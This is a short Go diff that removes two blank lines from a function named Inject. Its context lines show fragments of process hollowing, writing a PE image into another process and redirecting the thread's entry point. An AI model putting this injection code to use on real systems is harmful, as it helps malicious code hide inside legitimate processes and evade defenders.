@@ -99,7 +99,6 @@ func Inject(srcPath, destPath string, destBuf []byte) {
 	if err != nil {
 		panic(err)
 	}
-
 	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
 	if err != nil {
 		panic(err)
@@ -164,7 +163,6 @@ func Inject(srcPath, destPath string, destBuf []byte) {
 	}
 
 	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
-
 	err = SetThreadContext(hThread, ctx)
 	if err != nil {
 		panic(err)
